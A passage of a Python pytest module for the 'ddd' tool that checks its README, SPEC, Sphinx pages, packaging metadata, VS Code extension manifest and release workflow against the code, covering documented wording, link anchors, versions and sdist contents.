            "and the conversion's own: a whole datatype's count is the nearest one, an exact half "
            "going to the even count, either side of zero, as ``round_physical`` rounds"
        ) in text
        assert (
            "a float's is the float its datatype stores nearest, spelled as briefly as it reads "
            "back, so 0.3 at a factor of 0.1 is 3"
        ) in text
        # The final wave: FLT_MAX's briefest spelling is a double past it, and a boolean is
        # written as one.
        assert (
            "FLT_MAX, either side of zero, is its own double, 3.4028234663852886e+38, planned so "
            "and shown so in raw: its briefest spelling, 3.4028235e+38, is a double past it, which "
            "the server and ``ddd check`` refuse a ``float32``"
        ) in text
        assert (
            "A float's value is written as a float, its whole numbers too, and a boolean's as "
            "``true`` or ``false``"
        ) in text
        # Fix round 1, M7 and M4: the shortest decimal is a float's; a whole datatype shows the
        # exact product, and a float32 reads as the float32 its file's number rounds to.
        old = "Physical shows the shortest decimal that reads back as the raw count it shows"
        assert old not in text
        assert (
            "Physical shows a whole datatype's raw count as the exact product, the count times the "
            "factor plus the offset, and a float's as the shortest decimal whose plan comes to "
            "that same float"
        ) in text
        assert (
            "a ``float32``'s being the float32 its file's number rounds to, which raw shows the "
            "same way, so a ``float32`` its file spells ``0.10000000149011612`` reads 0.1"
        ) in text
        assert (
            "never cut at twelve significant digits and never with the tail of the double "
            "arithmetic: 255 counts of 0.03 read 7.65"
        ) in text

    def test_the_values_grid_is_said_to_read_numbers_by_one_grammar(self) -> None:
        """What ``numbers.ts`` reads a number by, in every field, said where the grid is
        described: decimal notation, the spellings refused, and the one rule for a comma."""
        text = flattened(self.COMMAND_PAGE)
        assert (
            "Every field of the page reads a number the same way, in decimal notation: an "
            "optional sign, digits with an optional fraction or a fraction alone, and an optional "
            "exponent, the white space around it ignored"
        ) in text
        assert (
            "A number written in hexadecimal, binary or octal, ``Infinity``, ``NaN`` and digits "
            "parted by underscores are refused in one sentence, the same in every field, and "
            "nothing is asked of the server for them - but a size and a dimension, which may name "
            "a constant, read ``Infinity`` and ``NaN`` as names, as they read any name"
        ) in text
        # Fix round 1, M7: a first group of more than three digits named; M1: values read
        # together decided by commas grouping thousands as by a decimal comma, a block showing both
        # refused, the choice asked only where nothing else decides, and an answer standing; M7:
        # every field offering no choice named, not a range's alone.
        assert "after a first group of 0, or before anything but exactly three digits" not in text
        assert (
            "A comma is a decimal point where it cannot group thousands - after a first group of 0 "
            "or of more than three digits, or before anything but exactly three digits - and "
            "groups thousands where it cannot be a decimal point, two of them or a point after it; "
            "text holding both has its decimal point last, so ``1.234,5`` and ``1,234.5`` both "
            "read 1234.5"
        ) in text
        assert (
            "A block pasted where one value's comma can only be a decimal point reads every comma "
            "of it as one"
        ) not in text
        assert (
            "Values read together - a block pasted, the cells typed into a grid, a range's two "
            "fields - read a comma that could be either as the others show theirs, where they all "
            "show one reading: ``0,5`` makes ``1,250`` beside it one and a quarter, and "
            "``1,234,567`` makes ``1,500`` beside it fifteen hundred"
        ) in text
        assert (
            "A block pasted whose values show both readings is refused, in a sentence saying what "
            "it mixes"
        ) in text
        assert (
            "A comma that could be either, ``1,200``, is refused with the choice of what it means "
            "one press away where nothing else decides it, the same for a cell typed into and for "
            "a block pasted, and an answer given stands"
        ) in text
        assert "a range's two fields offer no such choice" not in text
        assert (
            "Only the grid offers that choice: a range's two fields, a size, a dimension, a "
            "constant's value, a section's alignment and a raster's event refuse such a comma in "
            "the same sentence"
        ) in text
        assert "A boolean takes 0 and 1 alone, in physical as in raw" in text

    def test_the_values_grid_is_said_to_draw_its_shape_and_its_hollow_cells(self) -> None:
        """What ``objectValues.ts`` draws of a grid's columns and of a cell the file does not
        state, and what the plan routes answer for a change of nothing, said where the grid is
        described."""
        text = flattened(self.COMMAND_PAGE)
        assert (
            "The grid has a column for each its shape has, and a row for each: a breakpoint only "
            "labels its column"
        ) in text
        assert (
            "A cell the file does not state - past the end of a short ``init``, or any cell of a "
            "declaration stating none - is drawn hollow, empty under a dashed border, its name "
            "saying it is not stated"
        ) in text
        assert (
            "A plan whose edit would leave its file as it was, every byte the same - a table "
            "pasted over the values the file spells, a description typed as it stands - is no "
            "change, and is offered as none"
        ) in text

    def test_the_values_picture_is_said_to_draw_what_the_file_states(self) -> None:
        """What ``ValuesGridView.tsx`` draws under the grid (``plotDrawn``, ``valuePlot.ts``), said
        where the grid is described: the values the file states, placed by index where the axis
        states fewer breakpoints than the shape, and no picture of a grid stating nothing."""
        text = flattened(self.COMMAND_PAGE)
        assert "left undrawn only where there is no grid to begin with" not in text
        assert (
            "or over plain indices where it has no axis, or one stating fewer breakpoints than "
            "the shape has columns, its ticks then reading the indices too, and no axis named "
            "under them"
        ) in text
        assert (
            "It draws what the file states, as the cells do: a scalar's one value draws none, "
            "and nor does a grid whose file states nothing, every cell of it hollow"
        ) in text

    def test_the_values_grid_is_said_to_hold_the_cells_typed_as_one_change(self) -> None:
        """What ``ValuesPage.tsx`` and ``typedCells.ts`` do with cells typed one after another,
        said where the grid is described: held together, one change, one Apply and one undo."""
        text = flattened(self.COMMAND_PAGE)
        assert "One cell is changed at a time" not in text
        assert (
            "Cells typed into are held together, each showing what was typed into it, and "
            "previewed as one change"
        ) in text
        assert "that one Apply writes, like every other change here, and one undo puts back" in text
        # The final wave: the sentence names five elements, then how many more, and the whole init
        # is written where the file does not write the array out far enough for the cells typed.
        assert "in a sentence naming what each sets" not in text
        assert (
            "in a sentence naming how many elements it sets, the first five of them and what each "
            "is set to, then how many more, and the producing file it lands in"
        ) in text
        assert "Only the cells typed are written" not in text
        assert (
            "Each cell typed is written where it stands, the rest of the file staying as it was, "
            "its spellings and its layout too, where the file writes its ``init`` out far enough "
            "to hold them"
        ) in text
        assert (
            "where it states one value for every cell, states none, or writes too short an array, "
            "the whole ``init`` is written instead - the cells typed set in it, every other "
            "holding the value the file states for it, or zero - and the preview shows it"
        ) in text
        assert "A cell keeps the reading it was typed in" in text
        assert (
            "A cell typed back to its file's value - a ``float32``'s to the same float32 - drops "
            "out of the change"
        ) in text
        assert (
            "a cell the page refuses holds Apply back for them all, named in the sentence"
        ) in text
        assert "The sentence and Apply stay at the foot of the window" in text
        assert (
            "in place of any cells typed before it, as a cell typed after it takes the table's "
            "place"
        ) in text

    def test_the_readme_lists_the_same_schema_kinds(self) -> None:
        listed = re.search(r"\| `ddd schema ([a-z|\\]+)`", README)
        assert listed is not None
        assert set(listed.group(1).replace("\\", "").split("|")) == {*schema_models(), "all"}

    def test_the_commands_said_to_take_format_json_are_the_ones_that_do(self) -> None:
        """Both pages enumerate them, and the command page counts them in words as well."""
        expected = commands_with("--format")
        counted = re.search(
            r"(\w+) commands understand ``--format json``: ((?:``[a-z-]+``(?:, | and )?)+)",
            flattened(self.COMMAND_PAGE),
        )
        assert counted is not None, "the command page no longer says which commands take it"
        assert NUMBER_WORDS[counted.group(1).lower()] == len(expected)
        assert sorted(re.findall(r"``([a-z-]+)``", counted.group(2))) == expected
        listed = re.search(
            r"available on every command that produces findings - ((?:`[a-z-]+`(?:, | and )?)+)",
            flattened(README),
        )
        assert listed is not None, "the readme no longer says which commands take it"
        assert sorted(re.findall(r"`([a-z-]+)`", listed.group(1))) == expected


def generate_options(artefact: str) -> set[str]:
    """The long options ``ddd generate ARTEFACT`` takes."""
    parser = _build_parser()
    commands = next(
        action for action in parser._actions if isinstance(action, argparse._SubParsersAction)
    )
    artefacts = next(
        action
        for action in commands.choices["generate"]._actions
        if isinstance(action, argparse._SubParsersAction)
    )
    return {
        option
        for action in artefacts.choices[artefact]._actions
        for option in action.option_strings
        if option.startswith("--")
    }


class TestTheA2lOptions:
    """The options the a2l takes and the c does not say where its addresses and its byte order
    come from, and what the project pastes into its module, so every document that says how to
    run ``generate`` names each of them."""

    OWN = sorted(generate_options("a2l") - generate_options("c"))

    def test_they_are_the_sources_of_the_addresses_the_byte_order_and_the_module_fragment(
        self,
    ) -> None:
        """The positive control: what the test below is parametrized over is not nothing."""
        assert self.OWN == ["--a2l-module-fragment", "--address-map", "--byte-order", "--image"]

    @pytest.mark.parametrize("option", OWN)
    @pytest.mark.parametrize(
        ("document", "spelling"),
        [
            ("docs/command_line_interface.rst", "``{}``"),
            ("README.md", "`{}"),
            ("SPEC.md", "`{}"),
        ],
    )
    def test_every_one_is_named(self, option: str, document: str, spelling: str) -> None:
        text = SPEC if document == "SPEC.md" else PAGES[document]
        assert spelling.format(option) in text


class TestTheDocumentationSite:
    """The site serves every version under its own directory, so a link without one is a 404.

    The root redirects to the newest release; ``latest/`` follows master, which is this tree,
    so a page a link names under it has to exist here.
    """

    @pytest.mark.parametrize("page", sorted(PAGES))
    def test_every_link_into_the_site_names_a_version_and_a_page(self, page: str) -> None:
        for link in re.findall(r"https://sauci\.github\.io/ddd/([^\s)>`\"]*)", PAGES[page]):
            if not link:
                continue  # the root, which redirects to the newest release
            version, _, path = link.partition("/")
            assert version == "latest" or re.fullmatch(r"v\d+(?:\.\d+)*", version), (
                f"{page} links {link}, which the site does not serve: pages live under "
                f"latest/ or v<tag>/"
            )
            if version == "latest" and path:
                target = ROOT / "docs" / path.split("#", 1)[0].replace(".html", ".rst")
                assert target.is_file(), f"{page} links {link}, and {target.name} does not exist"

    def test_the_build_configuration_counts_the_models_the_pages_render(self) -> None:
        """``docs/conf.py`` explains a setting by how many models the repetition would hit."""
        conf = (ROOT / "docs" / "conf.py").read_text(encoding="utf-8")
        rendered = sum(page.count("autopydantic_model::") for page in PAGES.values())
        counted = re.search(r"repeated under all ([a-z-]+) models", conf)
        assert counted is not None, "the comment no longer counts the models"
        assert spelled_number(counted.group(1)) == rendered, (
            f"docs/conf.py counts {counted.group(1)} models; the pages render {rendered}"
        )

    def test_the_acronyms_are_in_the_order_a_reader_looks_them_up_in(self) -> None:
        """The first table is alphabetical, and a term inserted anywhere else is unfindable.

        Seventeen terms the pages use were missing from it at once, which is how a page-sized
        table grows: each is added where the writer happened to be reading.
        """
        acronyms = PAGES["docs/acronyms.rst"].split("a2l keywords", 1)[0]
        terms = re.findall(r"^   \* - (.+)$", acronyms, flags=re.MULTILINE)[1:]
        assert terms == sorted(terms, key=str.lower), f"the acronyms table is out of order: {terms}"


def table_rows(page: str, heading: str) -> dict[str, str]:
    """The rows of the key table under a heading, as key to default cell.

    The reference pages write their key tables as list tables whose first cell is the key in
    double backticks and whose second is what it defaults to; the section runs from the
    heading to the next underlined title.
    """
    section = PAGES[page].split(heading, 1)[1]
    section = re.split(r"\n[^\n]+\n[-~=]{4,}\n", section, maxsplit=1)[0]
    return dict(re.findall(r"   \* - ``([a-z0-9_]+)``\n     - (.+)\n", section))


class TestTheKeyTables:
    """A key table that claims to list every key is held to the model that owns them.

    ``id`` and ``raster`` reached the definitions and the component over two releases and
    reached none of the tables, which tell a reader that an unknown key is refused.
    """

    @pytest.mark.parametrize("key", sorted(DataObject.model_fields))
    def test_every_common_key_of_a_definition_has_a_row(self, key: str) -> None:
        rows = table_rows("docs/file_formats/variable_definition.rst", "The common attributes\n")
        assert key in rows, f"the common attributes table lists {sorted(rows)}"

    @pytest.mark.parametrize("key", sorted(DataObject.model_fields))
    def test_every_common_key_of_a_definition_is_in_the_readme(self, key: str) -> None:
        assert f"\n| `{key}` |" in README

    @pytest.mark.parametrize("key", sorted(Component.model_fields))
    def test_every_key_of_a_component_has_a_row(self, key: str) -> None:
        rows = table_rows("docs/file_formats/component.rst", "Component description\n")
        assert key in rows, f"the component table lists {sorted(rows)}"

    @pytest.mark.parametrize("key", sorted(ScalarType.model_fields))
    def test_a_scalar_type_key_is_shown_as_required_when_the_model_requires_it(
        self, key: str
    ) -> None:
        """A cell saying "identity" where the model says required costs a whole project load."""
        rows = table_rows("docs/file_formats/types.rst", "Scalar types\n")
        assert key in rows, f"the scalar type table lists {sorted(rows)}"
        if key != "type" and ScalarType.model_fields[key].is_required():
            assert rows[key] == "required", f"{key} is required, the table says {rows[key]!r}"


class TestConcepts:
    @pytest.mark.parametrize("kind", sorted(ObjectKind))
    def test_every_object_kind_is_documented(self, kind: ObjectKind) -> None:
        assert f"`{kind.value}`" in README
        assert f"`{kind.value}`" in SPEC

    @pytest.mark.parametrize("datatype", sorted(Datatype))
    def test_every_datatype_is_documented(self, datatype: Datatype) -> None:
        assert f"`{datatype.value}`" in README
        assert f"`{datatype.value}`" in SPEC

    def test_the_readme_points_at_files_that_exist(self) -> None:
        """A dead link in the README is a lie about where the code lives."""
        for kind, target in re.findall(
            r"\]\(https://github\.com/Sauci/ddd/(blob|tree)/master/([^)#]+)", README
        ):
            path = ROOT / target
            assert path.exists(), f"README links to a missing path: {target}"
            assert path.is_dir() == (kind == "tree"), (
                f"README links {target} as a {kind}; GitHub serves a directory under tree/ "
                f"and a file under blob/"
            )

    def test_the_readme_links_no_path_a_reader_of_the_package_index_cannot_follow(self) -> None:
        """The README is the package description (``pyproject.toml``: ``readme``).

        PyPI renders it with the relative links exactly as written, and there is no repository
        around them there: every one of the thirty-odd links to a file of this repository was
        a 404 for anybody who arrived through the index rather than through GitHub. They are
        written absolute, the way the logo already was, which also survives the README being
        quoted anywhere else.
        """
        relative = re.findall(r"\]\((?!https?:|#)([^)]+)\)", README)
        assert not relative, (
            f"the README links these paths relatively: {relative}. The package index renders "
            f"them as written, where nothing resolves them - write "
            f"https://github.com/Sauci/ddd/blob/master/<path> instead."
        )

    def test_the_spec_points_at_files_that_exist(self) -> None:
        for target in re.findall(r"\]\((?!https?:)([^)#]+)", SPEC):
            assert (ROOT / target).exists(), f"SPEC links to a missing path: {target}"


def spec_headings() -> list[tuple[int, str]]:
    """Every markdown heading of the SPEC with its level, code blocks excluded."""
    headings = []
    fenced = False
    for line in SPEC.splitlines():
        if line.startswith("```"):
            fenced = not fenced
        elif not fenced and (found := re.match(r"(#{1,5}) (.+)", line)):
            headings.append((len(found.group(1)), found.group(2)))
    return headings


def anchor_of(heading: str) -> str:
    """The anchor GitHub derives from a heading, which is what every SPEC link targets.

    Lower case, emphasis markers dropped, punctuation removed, spaces turned into
    hyphens - the slug of the *rendered* text. Pinned by examples in the tests below,
    because every internal link of the SPEC silently stops working if this drifts from
    what GitHub actually does.
    """
    text = heading.replace("*", "").lower()
    return re.sub(r"\s", "-", re.sub(r"[^\w\s-]", "", text))


def spec_links() -> list[tuple[str, str]]:
    """Every internal link of the SPEC, as (visible text, anchor)."""
    return re.findall(r"\[([^\]]+)\]\(#([A-Za-z0-9-]+)\)", SPEC)


def spec_toc() -> list[tuple[str, str]]:
    """The entries of the table of contents, in order, as (visible text, anchor)."""
    top = SPEC.split("\n## ", 1)[0]
    return re.findall(r"^\s*[*-] \[([^\]]+)\]\(#([a-z0-9-]+)\)$", top, flags=re.MULTILINE)


class TestSpecCrossReferences:
    """The SPEC's section links and its table of contents, kept honest mechanically.

    The anchors are derived from heading text, so a retitled or renumbered section breaks
    every link to it without any renderer saying so; and the table of contents is a second
    copy of the outline, which is to say a second thing that can quietly disagree with the
    first. Neither failure shows up in a rendered preview, which is why both are pinned
    here.
    """

    @pytest.mark.parametrize(
        ("heading", "anchor"),
        [
            ("3.3.1 One object, several declarations", "331-one-object-several-declarations"),
            ("3.5 Memory placement *(planned)*", "35-memory-placement-planned"),
            ("5.2 A2L", "52-a2l"),
            ("1.1 Requirement words", "11-requirement-words"),
        ],
    )
    def test_the_anchor_rule_is_the_one_github_applies(self, heading: str, anchor: str) -> None:
        assert anchor_of(heading) == anchor

    def test_every_link_resolves_to_a_heading(self) -> None:
        """A broken anchor renders exactly like a working one; only a click tells them apart."""
        anchors = {anchor_of(text) for _, text in spec_headings()}
        dangling = [(text, target) for text, target in spec_links() if target not in anchors]
        assert not dangling, f"SPEC links that resolve to no heading: {dangling}"

    def test_the_table_of_contents_is_the_outline(self) -> None:
        """Every heading, in order, both directions: nothing missing, nothing stale.

        The list is maintained with the editor's table-of-contents generator, which starts
        at the document title and descends to the deepest level; this pins that whatever
        regenerates it keeps covering all of them.
        """
        outline = [(text, anchor_of(text)) for _, text in spec_headings()]
        assert spec_toc() == outline, (
            "the table of contents and the headings have come apart; regenerate the list at "
            "the top of SPEC.md from the section headings"
        )

    def test_a_numbered_link_points_at_the_section_it_names(self) -> None:
        """``[section 3.6](#36-...)`` states the number twice; renumbering can break the
        two apart, and the link then reads right while landing wrong."""
        for text, target in spec_links():
            numbered = re.match(r"(?:section )?(\d+(?:\.\d+)*)(?: |$)", text)
            if numbered:
                digits = numbered.group(1).replace(".", "")
                assert target.startswith(f"{digits}-"), (
                    f"the link [{text}] points at #{target}, "
                    f"which is not section {numbered.group(1)}"
                )


def paths_under_root(source: str) -> set[str]:
    """Every ``ROOT / "a" / "b"`` a module spells out, relative to the checkout.

    Only the whole chain is taken and not the directories on the way to it, and only chains
    whose parts are all literal - one assembled out of a variable is one this cannot follow.
    A ``glob`` or ``rglob`` read collapses to the directory it walks by itself, that
    directory being the receiver of the call and so the chain the walk finds.
    """
    found: set[str] = set()

    def parts(node: ast.AST) -> list[str] | None:
        if isinstance(node, ast.Name) and node.id == "ROOT":
            return []
        if not isinstance(node, ast.BinOp) or not isinstance(node.op, ast.Div):
            return None
        left = parts(node.left)
        if left is None or not isinstance(node.right, ast.Constant):
            return None
        return None if not isinstance(node.right.value, str) else [*left, node.right.value]

    def walk(node: ast.AST) -> None:
        spelled = parts(node)
        if spelled:
            found.add("/".join(spelled))
            return
        for child in ast.iter_child_nodes(node):
            walk(child)

    walk(ast.parse(source))
    return found


def images_the_docs_build_reads() -> list[str]:
    """The logo and the favicon ``docs/conf.py`` names, relative to the checkout.

    Both are spelled relative to ``docs/``, and both are read by the build rather than by a
    page, so no page names them and nothing else here would notice their absence.
    """
    tree = ast.parse((ROOT / "docs" / "conf.py").read_text(encoding="utf-8"))
    named = [
        node.value.value
        for node in ast.walk(tree)
        if isinstance(node, ast.Assign)
        and isinstance(node.value, ast.Constant)
        and isinstance(node.value.value, str)
        and any(
            isinstance(target, ast.Name) and target.id in ("html_logo", "html_favicon")
            for target in node.targets
        )
    ]
    return [(ROOT / "docs" / name).resolve().relative_to(ROOT).as_posix() for name in named]


class TestPackaging:
    """What a customer receives has to match what the sources say it is."""

    def test_the_version_is_the_same_in_both_places(self) -> None:
        """The banner of every generated file carries it, and the release tag is checked
        against it, so a drift between the package and the module is a released lie."""
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        assert metadata["project"]["version"] == __version__

    def test_the_editor_extension_carries_the_same_version(self) -> None:
        """The extension is a launcher for a server this package ships, so a version of its
        own would be a second number to explain, and the one a user quotes in a bug report."""
        manifest = json.loads(
            (ROOT / "editors" / "vscode" / "package.json").read_text(encoding="utf-8")
        )
        assert manifest["version"] == __version__

    def test_the_lock_file_carries_it_too(self) -> None:
        """Nothing else compares the lock's own version with anything.

        ``npm ci`` refuses a lock file out of step with its manifest's *dependencies*; the
        root package's ``version`` is not part of that comparison, and the lock records it
        twice - in its header and in the entry for the root package. So a release commit that
        bumped ``package.json`` and left the lock behind packaged a ``.vsix`` whose lock file
        said the version before, with a green extension job.
        """
        lock = json.loads(
            (ROOT / "editors" / "vscode" / "package-lock.json").read_text(encoding="utf-8")
        )
        assert lock["version"] == __version__, "the lock file's header is a version behind"
        assert lock["packages"][""]["version"] == __version__, (
            "the lock file's entry for the root package is a version behind"
        )

    def test_the_cmake_module_states_this_release(self) -> None:
        """The module refuses a ``ddd`` of another release, so it has to know its own.

        It is shipped inside the wheel and invited into a project's own tree by ``ddd
        cmake-dir``, where it then sits beside whichever tool the environment has; the
        handshake at include time compares this string with what ``ddd --version`` prints, so
        a release that bumps the package and not the module refuses *itself*.
        """
        module = (ROOT / "cmake" / "Ddd.cmake").read_text(encoding="utf-8")
        stated = re.search(r'set\(DDD_MODULE_VERSION "([^"]+)"\)', module)
        assert stated is not None, "the module no longer states which release it belongs to"
        assert stated.group(1) == __version__, (
            "cmake/Ddd.cmake states another release than the package, so every build "
            "configured with this tool is refused by its own module"
        )

    def test_the_declared_license_file_exists(self) -> None:
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        license_file = metadata["project"]["license"]["file"]
        assert (ROOT / license_file).is_file(), "the declared license file is not in the tree"

    def test_the_extension_is_installed_from_where_the_documentation_says(self) -> None:
        """The ``.vsix`` on the release is the only way in, so every page has to say so.

        The extension was never published to the Visual Studio Marketplace: the step that
        would have done it failed on both releases that ran it, and the publisher it needs
        lives in an Azure DevOps organisation nobody set up. Four pages nonetheless told a
        customer to search the Extensions view and linked an item page that answers 404.
        The release asset is what actually exists, and it is what they now name.
        """
        manifest = json.loads(
            (ROOT / "editors" / "vscode" / "package.json").read_text(encoding="utf-8")
        )
        # The item page, derived the way the marketplace addresses an extension. The *manage*
        # url is a different thing and stays: the developer documentation cites it as the
        # prerequisite of publishing there, which is guidance for a maintainer rather than an
        # install instruction pointed at a customer.
        item = f"items?itemName={manifest['publisher']}.{manifest['name']}"
        pages = [
            ROOT / "README.md",
            ROOT / "editors" / "vscode" / "README.md",
            ROOT / "docs" / "editor_integration.rst",
            ROOT / "docs" / "developer_documentation.rst",
        ]
        for page in pages:
            text = page.read_text(encoding="utf-8")
            assert item not in text, (
                f"{page.name} still sends a customer to the marketplace item page, which "
                f"has no extension on it and no workflow putting one there"
            )
            assert "ddd-<version>.vsix" in text, (
                f"{page.name} does not name the .vsix on the release, which is the only "
                f"way the extension can be installed"
            )

    def test_a_release_does_not_publish_the_extension_to_the_marketplace(self) -> None:
        """The decision, pinned where re-adding it would have to argue with something.

        The step existed, needed a ``VSCE_PAT`` nobody had, and failed on every release it
        ran on while the rest of the pipeline reported success around it. Restoring it means
        creating the publisher first - and, before that, putting the four pages above back.
        """
        assert "vsce" not in PUBLISH_WORKFLOW, (
            "the release publishes the extension to the marketplace again, but nothing "
            "installs it from there and no page tells anybody to"
        )
        assert "VSCE_PAT" not in PUBLISH_WORKFLOW, (
            "the marketplace token is back in the workflow with nothing to authenticate"
        )

    def test_the_release_carries_the_built_extension(self) -> None:
        """What replaced the marketplace: the ``.vsix`` still has to reach somebody.

        Removing the publish step must not take the packaging and the upload with it - a
        permanent url needing no account and no network policy exception is the whole of how
        the extension is installed now.
        """
        body = PUBLISH_WORKFLOW.split("\n  extension:\n", 1)[1]
        # Up to the next job, which is the next key at the indentation a job name sits at.
        extension = re.split(r"\n  [a-z][\w-]*:\n", body, maxsplit=1)[0]
        assert "npm run package" in extension, "the release no longer builds the .vsix"
        assert "gh release upload" in extension, (
            "the release no longer attaches the .vsix, so nothing ships the extension"
        )

    def test_the_extension_carries_the_license_it_declares(self) -> None:
        """``vsce`` packages nothing from outside the extension directory, so the root
        LICENSE never reaches the .vsix, and whoever unpacks one would find a licence it
        names and does not carry. The copy beside the manifest has to stay a copy."""
        extension = ROOT / "editors" / "vscode"
        manifest = json.loads((extension / "package.json").read_text(encoding="utf-8"))
        assert manifest["license"] == "MIT"
        shipped = (extension / "LICENSE").read_text(encoding="utf-8").splitlines()
        assert shipped == (ROOT / "LICENSE").read_text(encoding="utf-8").splitlines(), (
            "editors/vscode/LICENSE has drifted from the licence the project is under"
        )

    def test_everything_the_readme_tells_the_user_to_install_is_shipped(self) -> None:
        """`ddd cmake-dir` is documented, so the module has to travel in the wheel rather
        than existing only in a git checkout."""
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        wheel = metadata["tool"]["hatch"]["build"]["targets"]["wheel"]
        for source in ("cmake/Ddd.cmake",):
            assert source in wheel["force-include"], f"{source} is not shipped in the wheel"
            assert (ROOT / source).is_file()

    def test_no_dependency_list_is_both_dynamic_and_static(self) -> None:
        """Declaring a field dynamic *and* stating it is an error the build backend refuses.

        It costs nothing here and fails nothing locally - the tests import the package from
        ``src`` - so it surfaces only when somebody installs the project, which in practice
        means in ci or on a customer's machine.
        """
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        project = metadata["project"]
        for field in project.get("dynamic", []):
            assert field not in project, (
                f"'{field}' is listed in [project].dynamic and also stated statically; the "
                f"metadata hook refuses that and every install of this project fails"
            )

    def test_every_requirements_file_is_declared_and_shipped(self) -> None:
        """The dependency lists live in requirements files, read by a metadata hook.

        A file the hook names but the sdist leaves out makes that sdist unbuildable, and the
        failure only shows up for whoever installs from it - which is nobody until a customer
        does.
        """
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        hook = metadata["tool"]["hatch"]["metadata"]["hooks"]["requirements_txt"]
        named = list(hook["files"])
        for group in hook["optional-dependencies"].values():
            named.extend(group)
        shipped = metadata["tool"]["hatch"]["build"]["targets"]["sdist"]["include"]
        # The sdist patterns are anchored with a leading slash, so an unanchored name does
        # not also sweep in a same-named file somewhere deeper in the tree.
        shipped = {pattern.lstrip("/") for pattern in shipped}
        for name in named:
            assert (ROOT / name).is_file(), f"{name} is declared but missing from the tree"
            assert name in shipped, f"{name} is not in the sdist, which cannot then be built"

    def test_everything_the_suite_and_the_docs_build_read_travels_in_the_sdist(self) -> None:
        """The include list is the only thing deciding what an sdist carries, and nothing
        builds one until it is too late to notice: ci runs the suite and the documentation
        out of the checkout, where every path is there whether the list names it or not,
        and ``publish.yml`` builds the archive after all of that has already passed. A path
        the list leaves out is therefore found by whoever installs from the archive - the
        evaluator the archive is sent to, or nobody at all.

        Both failures this pins have happened. ``docs/conf.py`` takes its logo and its
        favicon from ``assets/``, which did not travel, and ``-W`` turned the two missing
        images into a failed documentation build; ``.github/workflows/docs.yml``, which the
        tests here read at import, did not travel either, and the suite stopped at
        collection rather than running. Reading the paths out of the sources rather than
        out of a built archive keeps the answer in the ordinary test run, where a new
        ``ROOT / ...`` is answered as it is written.
        """
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        patterns = [
            pattern.lstrip("/")
            for pattern in metadata["tool"]["hatch"]["build"]["targets"]["sdist"]["include"]
        ]
        for pattern in patterns:
            assert (ROOT / pattern).exists(), (
                f"the sdist includes {pattern}, which is not in the tree: the pattern is "
                f"misspelled, or names something that has since moved"
            )
        read = {
            name
            for module in sorted((ROOT / "tests").glob("*.py"))
            for name in paths_under_root(module.read_text(encoding="utf-8"))
        }
        read.update(images_the_docs_build_reads())
        # Hatchling writes the build definition into every sdist whatever the list says.
        read.discard("pyproject.toml")
        # Positive control: the loop below passes over an empty set, and the set is built by
        # a regex over the suite's own source - so a change of spelling in how a test names a
        # path would switch this guard off rather than fail it.
        assert read, "no path under the root is recognised in the suite's sources"
        for name in sorted(read):
            assert (ROOT / name).exists(), f"the suite reads {name}, which is not in the tree"
            # A directory travels either whole, under a pattern that covers it, or in the
            # part of it a narrower pattern names - "src" is on the path of the shell
            # transcripts, and "/src/ddd" is what puts it in the archive.
            assert any(
                name == pattern or name.startswith(f"{pattern}/") or pattern.startswith(f"{name}/")
                for pattern in patterns
            ), (
                f"{name} is read here but no sdist pattern carries it, so the suite or the "
                f"documentation build fails for whoever installs from the archive"
            )

    @pytest.mark.parametrize(
        ("name", "without_it"),
        [
            (
                "SECURITY.md",
                "whoever reads the archive has no way of reporting a vulnerability privately",
            ),
            (
                ".dockerignore",
                "an image built from the unpacked archive copies in the compiled pages it holds, "
                "which docker/Dockerfile says the build context never has",
            ),
            (
                ".gitattributes",
                "the unpacked archive put under git on windows checks the image's scripts out "
                "with the crlf endings their shebangs fail on",
            ),
        ],
        ids=["SECURITY.md", ".dockerignore", ".gitattributes"],
    )
    def test_the_sdist_carries_its_policy_and_what_its_builds_are_told(
        self, name: str, without_it: str
    ) -> None:
        """20:M6. The archive is what an evaluator is sent, and it carries ``docker/``, the
        compose file and the pages compiled into ``src/ddd/gui/static``. Three files at the
        root say how the tree is to be built and reported on, and none of the suite reads
        them, so no test above could notice their absence."""
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        shipped = {
            pattern.lstrip("/")
            for pattern in metadata["tool"]["hatch"]["build"]["targets"]["sdist"]["include"]
        }
        assert (ROOT / name).is_file(), f"{name} is not in the tree"
        assert name in shipped, f"the sdist leaves out {name}, so {without_it}"

    def test_the_runtime_requirements_are_what_the_package_imports(self) -> None:
        """The three runtime dependencies are a deliberate claim of the README, so a fourth one
        appearing in requirements.txt has to be a decision rather than a drive-by addition.
        pyelftools was one: it joined when reading ELF images became part of DDD rather than an
        extra, after an old copy already installed in a venv went unnoticed by the extra."""
        listed = {
            re.split(r"[<>=!~ ]", line, maxsplit=1)[0].lower()
            for line in (ROOT / "requirements.txt").read_text(encoding="utf-8").splitlines()
            if line.strip() and not line.startswith("#")
        }
        assert listed == {"pydantic", "jinja2", "pyelftools"}

    def test_the_requirements_name_both_commands_that_read_an_image(self) -> None:
        """20:M12. The comment on pyelftools named ``ddd tool from-elf`` alone, "today", as though
        it were the one reader of an image: ``ddd generate`` given ``--image`` is the other."""
        said = comments_of((ROOT / "requirements.txt").read_text(encoding="utf-8"))
        assert (
            "What DDD reads ELF images and their DWARF with: `ddd tool from-elf`, and `ddd "
            "generate` given `--image`."
        ) in said
        assert "today" not in said

    def test_the_extension_declines_an_untrusted_workspace_and_the_pages_say_why(self) -> None:
        """A description file names the plugins the server runs, and the server imports the
        plugins of every description file it reads at or above an opened file to find the
        project that includes it. Opening a repository is therefore running its python,
        which VS Code's workspace trust exists to gate: the manifest has to opt out of
        restricted mode, and the reader has to be told."""
        manifest = json.loads(
            (ROOT / "editors" / "vscode" / "package.json").read_text(encoding="utf-8")
        )
        assert manifest["capabilities"]["untrustedWorkspaces"]["supported"] is False
        stated = {
            ROOT / "docs" / "editor_integration.rst": (
                "What the server runs",
                "a plugin is imported when its project is read",
            ),
            ROOT / "editors" / "vscode" / "README.md": (
                "## Trust",
                "trust the workspace when you would run its build",
            ),
            ROOT / "docs" / "plugins.rst": ("Naming a plugin runs it",),
